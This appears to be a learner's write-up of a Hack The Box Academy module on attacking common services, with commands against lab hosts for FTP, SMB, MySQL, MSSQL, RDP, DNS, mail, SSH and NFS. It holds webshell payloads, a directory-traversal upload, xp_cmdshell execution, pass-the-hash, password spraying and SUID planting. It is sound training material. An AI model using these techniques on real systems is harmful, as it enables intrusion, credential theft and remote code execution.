# HTB Academy — Module 11: Attacking Common Services

| Field | Details |
|---|---|
| Platform | Hack The Box Academy |
| Module | 11 — Attacking Common Services |
| Difficulty | Medium |
| Type | Offensive — Service Enumeration and Exploitation |
| Date | April 2026 |

---

## Module Overview

Every open port is an attack surface. This module teaches how to approach the most common network services from an attacker's perspective — not just what tools to run, but why specific techniques work, what misconfigurations make them possible, and how to chain findings across services to reach a full compromise.

The core methodology is identical for every service:

```
Enumerate → Identify Version → Find Misconfiguration or CVE → Exploit → Escalate
```

The tools change. The logic never does.

**Services covered:**

| Service | Port(s) | Protocol |
|---|---|---|
| FTP | 21 | TCP |
| SMB | 139, 445 | TCP |
| MySQL | 3306 | TCP |
| MSSQL | 1433 | TCP |
| RDP | 3389 | TCP |
| DNS | 53 | TCP/UDP |
| SMTP | 25, 587 | TCP |
| IMAP | 143, 993 | TCP |
| POP3 | 110, 995 | TCP |
| SSH | 22 | TCP |
| NFS | 2049 | TCP |

---

## Section 1 — Introduction: The Attacker's Mindset

Before running any tool against a service, answer five questions:

| Question | Tool / Method |
|---|---|
| What is it? | `nmap -sV` |
| What version? | `searchsploit <software> <version>` |
| Does it require authentication? | Try anonymous / default credentials |
| What can I read or write? | Enumerate permissions |
| Can I get code execution? | Exploit features or known CVEs |

Defenders ask: "Is this service running correctly?" Attackers ask: "Can I abuse this service to get access?" Every misconfiguration, every default credential, every unpatched version is an entry point.

Manual interaction is non-negotiable. Automated tools are fast but opaque. Learning to speak a service's protocol manually means understanding why exploits work — and being able to adapt when tools fail.

| Service | Manual Interaction |
|---|---|
| FTP | `ftp` client, `nc` |
| SMB | `smbclient`, `crackmapexec` |
| HTTP | `curl`, Burp Suite |
| MySQL | `mysql` client |
| MSSQL | `mssqlclient.py`, `sqsh` |
| SMTP | `nc`, `telnet`, `swaks` |
| IMAP/POP3 | `nc`, `openssl s_client` |
| SSH | `ssh` client |
| RDP | `xfreerdp` |

---

## Section 2 — FTP (File Transfer Protocol) | Port 21

FTP transfers files between client and server. It operates in cleartext — credentials and data are both unencrypted unless FTPS is configured. Many servers leave anonymous login enabled by default.

**Why attackers target it:**
- Anonymous login requires no credentials
- Cleartext credentials are sniffable on the network
- Misconfigured servers expose sensitive directories
- Writable FTP roots allow file uploads — potentially into web directories

### Enumeration

```bash
Hackerpatel007_1@htb[/htb]$ nmap -sV -p21 -sC --script ftp-anon,ftp-syst 10.129.57.117
```

Check for anonymous access immediately — Nmap's `ftp-anon` script flags it in the output.

### Anonymous Login

```bash
Hackerpatel007_1@htb[/htb]$ ftp 10.129.57.117
# Username: anonymous
# Password: (press Enter)

ftp> ls -la
ftp> ls -R          # Recursive listing — maps entire structure at once
ftp> get secret.txt
ftp> mget *         # Download everything
ftp> put test.txt   # Test write access
ftp> bye
```

### Credential Brute Force

```bash
Hackerpatel007_1@htb[/htb]$ hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://10.129.57.117 -t 1
```

Use `-t 1` — rate-limited FTP servers silently fail with multiple threads.

### Download Entire FTP Tree

```bash
Hackerpatel007_1@htb[/htb]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.57.117
```

### CoreFTP CVE-2022-22836 (Directory Traversal)

CoreFTP build 725 allows unauthenticated directory traversal via PUT with a path traversal payload:

```bash
Hackerpatel007_1@htb[/htb]$ curl -k -X PUT -H "Host: 10.129.57.117" \
--basic -u anonymous:anonymous \
-d '<?php echo system($_GET["c"]); ?>' \
"https://10.129.57.117:443/../../../../xampp/htdocs/shell.php" \
--path-as-is
```

`--path-as-is` is required — without it curl normalises the `../` sequences and the traversal fails silently.

### FTP Checklist

- ✅ Try anonymous login first — always
- ✅ Check write access — `put` a test file
- ✅ Read every file — credentials hide in config and log files
- ✅ Check FTPS (port 990) — SSL cert may expose internal hostname
- ✅ CoreFTP build 725 → CVE-2022-22836 directory traversal

---

## Section 3 — SMB (Server Message Block) | Ports 139, 445

SMB is the backbone of Windows file sharing. It is one of the most commonly attacked services because default configurations frequently allow unauthenticated access and password reuse is widespread.

**Why attackers target it:**
- Null sessions often permitted — anonymous enumeration without credentials
- Password spraying is effective and hard to detect if done slowly
- Misconfigured shares expose documents containing embedded credentials
- Legacy SMBv1 — EternalBlue (MS17-010) if unpatched

### Enumeration

```bash
# Service version and OS fingerprinting
Hackerpatel007_1@htb[/htb]$ nmap -sV -p445 -sC 10.129.57.117

# List shares — null session
Hackerpatel007_1@htb[/htb]$ smbclient -L //10.129.57.117/ -N
Hackerpatel007_1@htb[/htb]$ smbmap -H 10.129.57.117
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 10.129.57.117 --shares -u "" -p ""

# Full SMB enumeration
Hackerpatel007_1@htb[/htb]$ enum4linux -a 10.129.57.117
Hackerpatel007_1@htb[/htb]$ rpcclient -U "" -N 10.129.57.117
```

### Connecting to Shares

```bash
Hackerpatel007_1@htb[/htb]$ smbclient //10.129.57.117/ShareName -U username
smb: \> ls
smb: \> get credentials.txt
smb: \> put shell.php
smb: \> recurse ON
smb: \> mget *
```

### Password Spraying

```bash
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 10.129.57.117 -u users.txt -p 'Password123!' --continue-on-success
```

Spray with one password across many users. This avoids account lockout policies that trigger after N failed attempts for a single account.

### Pass-the-Hash (PTH)

```bash
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 10.129.57.117 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

NTLM hashes recovered from memory or files can authenticate directly to SMB without cracking — no password needed.

### SMB Checklist

- ✅ Check SMB version — SMBv1 = potential EternalBlue (MS17-010)
- ✅ Try null session first — `smbclient -N`
- ✅ Map all share permissions with `smbmap`
- ✅ Download everything readable — credentials hide in Word and Excel files
- ✅ Try every recovered credential against SMB — password reuse is common
- ✅ If admin hash found → Pass-the-Hash immediately

---

## Section 4 — MySQL | Port 3306

MySQL is the most widely deployed open-source database. XAMPP installs it with root and no password by default. Misconfigured `secure_file_priv` enables direct filesystem access from SQL queries.

**Why attackers target it:**
- Default root with no password on XAMPP
- `secure_file_priv = ""` allows reading and writing arbitrary files
- User tables contain application credentials
- File write into web directory = webshell = RCE

### Connection

```bash
Hackerpatel007_1@htb[/htb]$ mysql -u root -h 10.129.57.117                   # No password
Hackerpatel007_1@htb[/htb]$ mysql -u root -p'password' -h 10.129.57.117
Hackerpatel007_1@htb[/htb]$ mysql -u root -h 10.129.57.117 --skip-ssl        # When client demands SSL but server is old
```

### Core Enumeration Queries

```sql
SHOW DATABASES;
USE <database>;
SHOW TABLES;
SELECT * FROM users;
SELECT user, password, host FROM mysql.user;
SHOW VARIABLES LIKE "secure_file_priv";
```

`secure_file_priv = ""` (empty) means no restriction — read and write anywhere the MySQL process has filesystem access.

### File Operations via SQL

```sql
-- Read system files
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts');

-- Write a webshell (Linux)
SELECT "<?php echo shell_exec($_GET['c']); ?>"
INTO OUTFILE '/var/www/html/shell.php';

-- Write a webshell (Windows XAMPP)
SELECT "<?php echo shell_exec($_GET['c']); ?>"
INTO OUTFILE 'C:/xampp/htdocs/shell.php';
```

After writing the shell, trigger it:

```bash
Hackerpatel007_1@htb[/htb]$ curl "http://10.129.57.117/shell.php?c=whoami"
Hackerpatel007_1@htb[/htb]$ curl "http://10.129.57.117/shell.php?c=type+C:\Users\Administrator\Desktop\flag.txt"
```

### MySQL Checklist

- ✅ Try root with no password — XAMPP default
- ✅ `SHOW VARIABLES LIKE "secure_file_priv"` — empty = full filesystem access
- ✅ Dump all user tables across all databases
- ✅ Write webshell when `secure_file_priv` is empty and web root is known
- ✅ Credential reuse — DB passwords often reused on OS and other services

---

## Section 5 — MSSQL (Microsoft SQL Server) | Port 1433

MSSQL is SQL Server for Windows environments. Beyond standard database access, it can execute operating system commands via the `xp_cmdshell` stored procedure — turning database access into full OS command execution.

**Why attackers target it:**
- `xp_cmdshell` can run OS commands as the SQL Server service account
- Linked servers allow pivoting across multiple database servers via SQL
- Credential reuse from other Windows services
- Service account may have elevated OS privileges

### Connection

```bash
Hackerpatel007_1@htb[/htb]$ mssqlclient.py user:password@10.129.57.117
Hackerpatel007_1@htb[/htb]$ mssqlclient.py user:password@10.129.57.117 -windows-auth   # Domain auth
Hackerpatel007_1@htb[/htb]$ sqsh -S 10.129.57.117 -U user -P password
```

### OS Command Execution via xp_cmdshell

```sql
-- Enable xp_cmdshell (disabled by default)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\flag.txt';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'dir C:\Users';
```

### User Impersonation and Privilege Escalation

```sql
-- Check current user
SELECT user_name();
SELECT IS_SRVROLEMEMBER('sysadmin');   -- Are we sysadmin?

-- Impersonate a higher-privilege user
EXECUTE AS LOGIN = 'sa';
SELECT system_user;                    -- Confirm impersonation
EXEC xp_cmdshell 'whoami';            -- Now runs as sa
```

### Linked Servers — Pivoting via SQL

```sql
-- List linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

-- Execute commands on a linked server
EXEC ('xp_cmdshell ''whoami''') AT [linked_server_name]
EXEC ('SELECT * FROM users') AT [linked_server_name]
```

### MSSQL Checklist

- ✅ Enable `xp_cmdshell` — first priority after gaining database access
- ✅ Check `IS_SRVROLEMEMBER('sysadmin')` — if yes, `xp_cmdshell` works immediately
- ✅ Try impersonation if not sysadmin — `EXECUTE AS LOGIN = 'sa'`
- ✅ Enumerate linked servers — each is a new pivot target
- ✅ Credential reuse — `sa` password often reused on Windows accounts

---

## Section 6 — RDP (Remote Desktop Protocol) | Port 3389

RDP provides full Windows GUI remote access. It is the highest-value access on a Windows engagement — a working RDP session means full interactive desktop control.

**Why attackers target it:**
- Full Windows desktop = full control
- Password spraying succeeds because many users have weak domain passwords
- BlueKeep (CVE-2019-0708) — unauthenticated RCE on unpatched Windows 7 / Server 2008
- Session hijacking if SYSTEM privileges are already obtained
- PTH with Restricted Admin Mode enabled

### Enumeration

```bash
Hackerpatel007_1@htb[/htb]$ nmap -sV -p 3389 --script rdp-ntlm-info 10.129.57.117
# rdp-ntlm-info reveals: hostname, domain, Windows version without credentials
```

### Connect with Credentials

```bash
Hackerpatel007_1@htb[/htb]$ xfreerdp /u:administrator /p:'Password123!' /v:10.129.57.117 /cert:ignore
Hackerpatel007_1@htb[/htb]$ xfreerdp /u:domain\\username /p:'pass' /v:10.129.57.117 /cert:ignore
```

### Password Spraying

```bash
Hackerpatel007_1@htb[/htb]$ hydra -L users.txt -p 'Password123!' rdp://10.129.57.117 -t 1
Hackerpatel007_1@htb[/htb]$ crowbar -b rdp -s 10.129.57.117/32 -U users.txt -c 'Password123!'
```

### Pass-the-Hash (Restricted Admin Mode)

```bash
Hackerpatel007_1@htb[/htb]$ xfreerdp /u:Administrator /pth:32693b11e6aa90eb43d32c72a07ceea6 /v:10.129.57.117 /cert:ignore
```

### Session Hijacking (Requires SYSTEM)

```bash
# List active sessions
Hackerpatel007_1@htb[/htb]$ query user

# Hijack another user's session — they are disconnected, you take over
Hackerpatel007_1@htb[/htb]$ tscon <session_ID> /dest:<your_session_name>
```

### RDP Checklist

- ✅ Extract hostname and OS version from `rdp-ntlm-info` before anything else
- ✅ Save every credential found — try all of them on RDP
- ✅ Old Windows version → check for BlueKeep (CVE-2019-0708)
- ✅ Once on machine: check Desktop, Documents, AppData for flags and credentials
- ✅ If SYSTEM already obtained → session hijacking via `tscon`

---

## Section 7 — DNS | Port 53

DNS maps hostnames to IP addresses. Attackers rarely exploit DNS directly for initial access but use it extensively for reconnaissance — zone transfers expose the entire internal network map in a single query.

**Why attackers target it:**
- Zone transfers expose every internal hostname and IP when misconfigured
- Subdomain and virtual host enumeration reveals hidden services
- DNS records expose infrastructure details (mail servers, CDN, cloud providers)
- Internal DNS from a foothold reveals network topology

### Zone Transfer

```bash
Hackerpatel007_1@htb[/htb]$ dig axfr @10.129.57.117 inlanefreight.htb
```

A successful zone transfer returns every DNS record in the zone — A records, MX records, CNAME records, internal hostnames — the entire infrastructure map in one query.

### Subdomain Enumeration

```bash
Hackerpatel007_1@htb[/htb]$ gobuster dns -d inlanefreight.htb \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

Hackerpatel007_1@htb[/htb]$ dnsrecon -d inlanefreight.htb -n 10.129.57.117 -t brt \
-D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### Virtual Host Fuzzing

```bash
Hackerpatel007_1@htb[/htb]$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-u http://10.129.57.117 \
-H "Host: FUZZ.inlanefreight.htb" \
-fs <normal_response_size>
```

A different response size means a valid virtual host was found — a host that has no public DNS record but exists on the server.

### Add Discovered Domains to /etc/hosts

```bash
Hackerpatel007_1@htb[/htb]$ sudo sh -c "echo '10.129.57.117 inlanefreight.htb dev.inlanefreight.htb admin.inlanefreight.htb' >> /etc/hosts"
```

### DNS Checklist

- ✅ Try zone transfer first — `dig axfr` — free full recon if misconfigured
- ✅ Add all discovered hostnames to `/etc/hosts` immediately
- ✅ Each subdomain is a separate attack surface
- ✅ Look for: `dev`, `staging`, `admin`, `vpn`, `backup` in subdomain names
- ✅ Virtual host fuzzing finds internal sites with no public DNS

---

## Section 8 — SMTP / IMAP / POP3 | Ports 25, 143, 110, 587, 993, 995

Email protocols are overlooked in most assessments but are high-value targets. SMTP user enumeration provides free valid usernames. Email inboxes contain credentials, internal documents, and password reset links.

- **SMTP** (25/587) — sending email
- **IMAP** (143/993) — reading email, server-side sync
- **POP3** (110/995) — downloading email

### SMTP User Enumeration

SMTP's `VRFY` and `RCPT TO` commands were designed to verify email addresses. On misconfigured servers they confirm if a user exists — no password needed.

```bash
Hackerpatel007_1@htb[/htb]$ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.57.117
Hackerpatel007_1@htb[/htb]$ smtp-user-enum -M VRFY -U users.list -t 10.129.57.117
```

Manual interaction to verify:

```bash
Hackerpatel007_1@htb[/htb]$ nc -nv 10.129.57.117 25
EHLO test
VRFY fiona@inlanefreight.htb
# 250 = user exists | 550 = does not exist
RCPT TO:<fiona@inlanefreight.htb>
```

### Open Relay Test

An open relay allows sending from any address to any address — abusable for phishing:

```bash
Hackerpatel007_1@htb[/htb]$ swaks --to victim@external.com \
--from ceo@inlanefreight.htb \
--server 10.129.57.117 \
--body "Test"
# Successful send = open relay confirmed
```

### IMAP — Reading Inbox Manually

```bash
Hackerpatel007_1@htb[/htb]$ nc -nv 10.129.57.117 143
# SSL connection:
Hackerpatel007_1@htb[/htb]$ openssl s_client -connect 10.129.57.117:993

# IMAP commands
a LOGIN fiona password123
b SELECT INBOX
c FETCH 1:* (FLAGS SUBJECT FROM)    # List all emails with subjects
d FETCH 1 BODY[]                    # Read full body of email 1
```

### POP3 — Reading Inbox Manually

```bash
Hackerpatel007_1@htb[/htb]$ nc -nv 10.129.57.117 110
USER fiona
PASS password123
LIST                    # Count and size of all messages
RETR 1                  # Read message 1
```

### Password Spray IMAP/POP3

```bash
Hackerpatel007_1@htb[/htb]$ hydra -L valid_users.txt -P passwords.txt imap://10.129.57.117 -t 10
Hackerpatel007_1@htb[/htb]$ hydra -L valid_users.txt -P passwords.txt pop3://10.129.57.117 -t 10
```

### Email Services Checklist

- ✅ SMTP → `smtp-user-enum` first — free valid usernames from VRFY/RCPT
- ✅ Test for open relay — MAIL FROM spoofed external address
- ✅ Spray IMAP/POP3 with discovered usernames and found passwords
- ✅ Read every email — credentials, internal URLs, and reset links appear constantly
- ✅ Check email subjects before reading bodies — `FETCH 1:* FLAGS SUBJECT` is fast

---

## Section 9 — SSH | Port 22

SSH provides encrypted remote shell access on Linux and Unix systems. It is the Linux equivalent of RDP — a working SSH session means full command execution.

**Why attackers target it:**
- Private key files found anywhere = immediate access without password
- Credential reuse from other services
- Username enumeration on older OpenSSH versions (< 7.7)
- Passphrase-protected keys can be cracked offline

### Connection

```bash
Hackerpatel007_1@htb[/htb]$ ssh user@10.129.57.117                      # Password auth
Hackerpatel007_1@htb[/htb]$ ssh -i id_rsa user@10.129.57.117            # Key-based auth
Hackerpatel007_1@htb[/htb]$ ssh -i id_rsa user@10.129.57.117 -p 2222    # Non-standard port
Hackerpatel007_1@htb[/htb]$ chmod 600 id_rsa                             # Required before using key
```

### Crack a Passphrase-Protected Key

```bash
Hackerpatel007_1@htb[/htb]$ ssh2john id_rsa > id_rsa.hash
Hackerpatel007_1@htb[/htb]$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### Password Brute Force

```bash
Hackerpatel007_1@htb[/htb]$ hydra -L users.txt -P rockyou.txt ssh://10.129.57.117 -t 4
```

### Username Enumeration (OpenSSH < 7.7)

Older versions of OpenSSH respond differently to valid vs invalid usernames:

```bash
Hackerpatel007_1@htb[/htb]$ python3 ssh-username-enum.py -U users.txt 10.129.57.117
```

### SSH Checklist

- ✅ Found an `id_rsa` anywhere — FTP, SMB, NFS, web? → `chmod 600` → `ssh` immediately
- ✅ Found any credential? → try on SSH (reuse is common)
- ✅ Old OpenSSH version → username enumeration possible
- ✅ Once in: `whoami`, `id`, `sudo -l`, `find / -perm -4000 2>/dev/null`

---

## Section 10 — Password Attacks on Services

Most real-world access comes from weak or reused passwords. Password attacks are the highest-yield technique per time invested — they require no CVE, no exploit, and no special knowledge of the target's architecture.

### Types of Password Attacks

| Type | Description | When to Use |
|---|---|---|
| Dictionary Attack | Try each entry in a wordlist | Default first approach |
| Password Spraying | One password against many accounts | Avoid lockout — domain environments |
| Brute Force | Try every character combination | Short PINs only — extremely slow |
| Credential Stuffing | Use breach dump username:password pairs | When leaked creds are available |
| Hash Cracking | Offline attack against captured hash | When a hash has been obtained |

### Hydra — Online Brute Force

```bash
# Syntax
Hackerpatel007_1@htb[/htb]$ hydra -l <user> -P <wordlist> <protocol>://<IP> [options]
Hackerpatel007_1@htb[/htb]$ hydra -L <userlist> -p <password> <protocol>://<IP> [options]

# Per-service examples
Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt ftp://10.129.57.117 -t 1
Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt ssh://10.129.57.117 -t 4
Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt rdp://10.129.57.117 -t 1
Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt smb://10.129.57.117
Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt mysql://10.129.57.117
Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt imap://10.129.57.117

# HTTP form login
Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt 10.129.57.117 http-post-form \
"/login:user=^USER^&pass=^PASS^:Invalid credentials" -t 10

# Critical flags
# -t 1    Single thread — for rate-limited services (CoreFTP, RDP)
# -f      Stop after first valid credential found
# -V      Verbose — show each attempt
# -I      Ignore restore file, start fresh
```

### Hashcat — Offline Hash Cracking

```bash
# Common hash modes
Hackerpatel007_1@htb[/htb]$ hashcat -m 0    hash.txt rockyou.txt    # MD5
Hackerpatel007_1@htb[/htb]$ hashcat -m 100  hash.txt rockyou.txt    # SHA1
Hackerpatel007_1@htb[/htb]$ hashcat -m 1000 hash.txt rockyou.txt    # NTLM (Windows)
Hackerpatel007_1@htb[/htb]$ hashcat -m 1800 hash.txt rockyou.txt    # SHA-512crypt (Linux /etc/shadow)
Hackerpatel007_1@htb[/htb]$ hashcat -m 300  hash.txt rockyou.txt    # MySQL4.1/MySQL5+

# Add rules to extend wordlist coverage
Hackerpatel007_1@htb[/htb]$ hashcat -m 1000 hash.txt rockyou.txt \
--rules-file /usr/share/hashcat/rules/best64.rule
```

### Default Credentials — Always Try First

| Service | Default Credentials | Context |
|---|---|---|
| MySQL | `root` / (empty) | XAMPP default |
| FTP | `anonymous` / (empty) | Many servers allow this |
| SMB | `guest` / (empty) | Null session |
| Tomcat | `admin:admin`, `tomcat:tomcat` | Apache Tomcat manager |
| Jenkins | `admin:admin` | Default install |
| phpMyAdmin | `root` / (empty) | XAMPP default |
| MSSQL | `sa` / (empty) | Sometimes left default |

---

## Section 11 — Protected Files and Archives

Credentials and sensitive data are frequently stored in password-protected archives, encrypted config files, and Office documents. These files contain a crackable hash that can be attacked offline.

### Extract and Crack Archive Hashes

```bash
Hackerpatel007_1@htb[/htb]$ zip2john protected.zip > zip.hash
Hackerpatel007_1@htb[/htb]$ rar2john protected.rar > rar.hash
Hackerpatel007_1@htb[/htb]$ 7z2john protected.7z > 7z.hash

Hackerpatel007_1@htb[/htb]$ john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
Hackerpatel007_1@htb[/htb]$ hashcat -m 17210 zip.hash rockyou.txt     # WinZip AES
Hackerpatel007_1@htb[/htb]$ hashcat -m 13600 zip.hash rockyou.txt     # 7-Zip
```

### Crack SSH Key Passphrases

```bash
Hackerpatel007_1@htb[/htb]$ ssh2john id_rsa > ssh.hash
Hackerpatel007_1@htb[/htb]$ john ssh.hash --wordlist=rockyou.txt
```

### Crack Office Document Passwords

```bash
Hackerpatel007_1@htb[/htb]$ office2john document.docx > office.hash
Hackerpatel007_1@htb[/htb]$ john office.hash --wordlist=rockyou.txt
```

### Protected Files Workflow

```
1. Identify protected file → extract hash with *2john tool
2. Identify hash format → check john --list=formats or hashcat --example-hashes
3. Run against rockyou.txt
4. If fails → add rules: hashcat --rules-file best64.rule
5. Crack → extract contents → look for more credentials
```

---

## Section 12 — NFS (Network File System) | Port 2049

NFS is the Linux/Unix equivalent of SMB — it allows remote mounting of directories as if they were local. The `no_root_squash` misconfiguration is one of the most dangerous settings in any network service — it gives attackers full root-level write access.

**Why attackers target it:**
- NFS exports accessible without authentication if misconfigured
- `no_root_squash` — writes to the share are made as root on the NFS server
- Exporting `/` or `/etc` exposes `/etc/shadow`

### Enumeration

```bash
Hackerpatel007_1@htb[/htb]$ showmount -e 10.129.57.117
# /var/nfs/general *               ← accessible by everyone
# /home/user *(rw,no_root_squash)  ← writable, no_root_squash = critical
```

### Mount and Explore

```bash
Hackerpatel007_1@htb[/htb]$ sudo mkdir /mnt/nfs
Hackerpatel007_1@htb[/htb]$ sudo mount -t nfs 10.129.57.117:/var/nfs/general /mnt/nfs -o nolock
Hackerpatel007_1@htb[/htb]$ ls -la /mnt/nfs
```

### no_root_squash Exploitation

When `no_root_squash` is set, files written to the NFS share by root on the attacker's machine are stored as root on the NFS server. This enables SUID binary planting:

```bash
# On attacker machine as root
Hackerpatel007_1@htb[/htb]$ cp /bin/bash /mnt/nfs/bash
Hackerpatel007_1@htb[/htb]$ chmod +s /mnt/nfs/bash      # Set SUID bit

# On target machine as low-privilege user
target@machine:~$ /mnt/nfs/bash -p
# -p preserves the SUID owner — spawns shell as root
```

### NFS Checklist

- ✅ `showmount -e` before anything else
- ✅ Check permissions on each export
- ✅ `no_root_squash` = critical — SUID bash = root immediately
- ✅ Read `/etc/shadow` if `/` is exported

---

## Section 13 — MSSQL Advanced — Linked Servers and Escalation

Linked servers in MSSQL allow executing queries and commands on remote database servers through the local instance. This is a pivoting mechanism that does not require network access to the remote server from the attacker's machine — the traffic goes through the SQL server.

```sql
-- Enumerate linked servers
EXEC sp_linkedservers;

-- Execute on linked server
EXEC ('SELECT @@servername') AT [LINKED_SERVER_NAME];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER_NAME];

-- Chain through multiple linked servers
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [SERVER2]') AT [SERVER1];
```

---

## The Complete Service Enumeration Checklist

Use this against any target. Work top to bottom:

```
PORT   SERVICE    FIRST CHECK
──────────────────────────────────────────────────────────────────────────
21     FTP        Anonymous login → brute force → check write access
22     SSH        Try all found credentials → look for id_rsa files
25     SMTP       smtp-user-enum → get valid usernames
53     DNS        dig axfr → zone transfer → subdomain + vhost enum
80/443 HTTP       gobuster → nikto → fingerprint app → searchsploit version
110    POP3       Spray found credentials → read messages
143    IMAP       Spray found credentials → read inbox
445    SMB        Null session → share enum → spray → PTH
2049   NFS        showmount -e → mount → check no_root_squash
3306   MySQL      root/empty → found creds → check secure_file_priv
1433   MSSQL      Found creds → enable xp_cmdshell → OS commands
3389   RDP        Use all found credentials → old Windows = BlueKeep check
──────────────────────────────────────────────────────────────────────────
```

---

## Post-Exploitation Checklists

### Windows Shell

```cmd
whoami                                            # Current user
whoami /priv                                      # Privileges
whoami /groups                                    # Group memberships
net user                                          # All local users
net localgroup administrators                     # Who's admin?
systeminfo                                        # OS, patches, architecture
where /r C:\ flag.txt                            # Find flag
where /r C:\ *.txt                               # Find all text files
where /r C:\ passwords.*                         # Find password files
type C:\Users\Administrator\Desktop\flag.txt     # Read flag
```

### Linux Shell

```bash
id                                                # User and groups
sudo -l                                           # Sudo permissions
cat /etc/passwd                                   # All users
cat /etc/shadow                                   # Password hashes (root required)
find / -name flag.txt 2>/dev/null                 # Find flag
find / -perm -4000 2>/dev/null                    # SUID binaries for privesc
cat /root/root.txt                                # Root flag
cat /home/*/user.txt                              # User flags
```

---

## Key Lessons from This Module

The most impactful realisation from working through this module is how rarely initial access requires a CVE. Most of the attack paths in these labs came from default credentials, anonymous access, or misconfigurations — not exploitation of unpatched software. XAMPP ships with MySQL root and no password. FTP servers leave anonymous login enabled. SMB null sessions work on default Windows configurations. The attack surface is not primarily software vulnerabilities — it is configuration failures.

The `-t 1` flag in Hydra was a specific lesson I needed to learn from failure. Rate-limited services like CoreFTP silently discard excess connections rather than returning errors. Running Hydra with multiple threads against a rate-limited service produces zero results — not an error, just silence. Single-threaded attacks are slower but necessary when the service has lockout or rate limiting in place.

`secure_file_priv = ""` on MySQL is the clearest example of a configuration setting that turns a database into a full RCE vector. The default XAMPP install leaves this empty, which means a root MySQL connection gives read and write access to the entire filesystem. Writing a PHP webshell via `SELECT INTO OUTFILE` and triggering it with `curl` is one of the most reliable attack chains in the module — it requires no CVE and works on any version of MySQL with this setting.

Service chaining is the core skill this module develops. Flags are almost never one step away. FTP gives credentials that work on SMB. SMB gives a hash that authenticates to RDP. SMTP user enumeration gives usernames that crack via IMAP. Every service is a node in a chain — the job is to find how they connect.

---

## Tools Reference

| Tool | Purpose |
|---|---|
| `nmap` | Service discovery, version detection, NSE scripts |
| `hydra` | Online password brute force and spraying |
| `hashcat` | Offline hash cracking |
| `john` | Hash cracking + `*2john` file hash extraction |
| `smbclient` | SMB share interaction |
| `crackmapexec` | SMB/WinRM enumeration, spraying, PTH |
| `enum4linux` | Full SMB/RPC enumeration |
| `smtp-user-enum` | SMTP username enumeration via VRFY/RCPT |
| `gobuster` | Directory, DNS subdomain, and VHost fuzzing |
| `ffuf` | Web fuzzing — flexible Host header manipulation |
| `mysql` | MySQL client — direct database interaction |
| `mssqlclient.py` | Impacket MSSQL client — xp_cmdshell, linked servers |
| `sqsh` | Alternative MSSQL client |
| `xfreerdp` | RDP client from Linux |
| `nc / netcat` | Manual service interaction — SMTP, FTP, IMAP, POP3 |
| `openssl s_client` | Manual TLS service interaction — IMAPS, FTPS |
| `swaks` | SMTP testing tool — open relay, header injection tests |
| `showmount` | NFS export enumeration |
| `dig` | DNS queries — A, MX, NS, TXT, zone transfer |
| `searchsploit` | Local CVE and exploit database search |
| `ssh2john` | Extract crackable hash from SSH private key |
| `zip2john` | Extract crackable hash from protected ZIP |
| `wget` | Recursive FTP download — `wget -m --no-passive` |
